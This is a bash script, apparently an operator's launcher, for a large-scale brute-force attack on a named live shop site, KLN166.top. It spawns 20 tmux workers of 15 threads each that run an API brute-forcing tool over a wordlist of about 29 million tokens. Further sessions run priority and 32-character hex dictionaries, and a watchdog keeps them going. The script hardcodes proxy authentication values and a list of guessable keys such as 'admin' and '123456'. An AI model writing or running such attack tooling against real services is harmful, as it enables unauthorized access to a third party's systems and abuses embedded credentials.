#!/bin/bash
# KLN166.top MAX attack — 20ch x 15 threads
set -euo pipefail

OUT=/data/automation/results/kln166.top/kami_attack_20260718
BIN=/data/automation/bin
WL=/data/wordlists/faka/faka-tokens.txt
PRI=/data/wordlists/faka/kln166-priority.txt
HEX=/data/wordlists/faka/kln166-hex32-sample.txt
TOTAL=29452734
WORKERS=20
THREADS=15
CHUNK=$((TOTAL / WORKERS))

export QG_AUTHKEY="${QG_AUTHKEY:-C413ED6D}"
export QG_AUTHPWD="${QG_AUTHPWD:-344F550A6F8B}"
export FFFZZ_TURBO=1
export FFFZZ_TIMEOUT=5
export FAKA_BASE="https://KLN166.top/shop/"
export FAKA_QUICK="kln166,KLN166,kulinan,kln166top,kln166.lol,admin,123456,api,test,secret"

mkdir -p "$OUT" "$BIN" /data/wordlists/faka
cp /tmp/fffzz_api_brute_fast.py "$BIN/faka_api_brute_fast.py" 2>/dev/null || \
  cp /tmp/faka_api_brute_fast.py "$BIN/" 2>/dev/null || true
cp /tmp/kln166_dict_gen.py /tmp/kln166_hex_dict_gen.py /tmp/qg-proxy-warm.sh /tmp/kln166_watchdog.sh "$BIN/" 2>/dev/null || true
chmod +x "$BIN/qg-proxy-warm.sh" "$BIN/kln166_watchdog.sh" 2>/dev/null || true

python3 "$BIN/kln166_dict_gen.py" "$PRI"
python3 "$BIN/kln166_hex_dict_gen.py" "$HEX"
bash "$BIN/qg-proxy-warm.sh" "$OUT" 2>/dev/null || true

for s in $(tmux ls 2>/dev/null | grep -E '^kln-' | cut -d: -f1); do
  tmux kill-session -t "$s" 2>/dev/null || true
done

export FAKA_OUT="$OUT"
for w in $(seq 0 $((WORKERS - 1))); do
  START=$((w * CHUNK))
  tmux new-session -d -s "kln-api-$w" \
    "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT QG_AUTHKEY=$QG_AUTHKEY QG_AUTHPWD=$QG_AUTHPWD FFFZZ_TURBO=1 python3 $BIN/faka_api_brute_fast.py $WL $START $CHUNK $THREADS $w $OUT 2>&1 | tee -a $OUT/api_w${w}.log"
  sleep 0.2
done

tmux new-session -d -s kln-priority \
  "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT QG_AUTHKEY=$QG_AUTHKEY QG_AUTHPWD=$QG_AUTHPWD FFFZZ_TURBO=1 python3 $BIN/faka_api_brute_fast.py $PRI 0 0 25 99 $OUT 2>&1 | tee -a $OUT/priority.log"

tmux new-session -d -s kln-hex32 \
  "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT QG_AUTHKEY=$QG_AUTHKEY QG_AUTHPWD=$QG_AUTHPWD FFFZZ_TURBO=1 python3 $BIN/faka_api_brute_fast.py $HEX 0 0 25 98 $OUT 2>&1 | tee -a $OUT/hex32.log"

tmux kill-session -t kln-watch 2>/dev/null || true
tmux new-session -d -s kln-watch "WORKERS=$WORKERS THREADS=$THREADS FAKA_BASE=$FAKA_BASE bash $BIN/kln166_watchdog.sh"

echo "KLN166 MAX: 20x15 + priority + hex32 + watchdog | base=$FAKA_BASE"
tmux ls | grep kln-
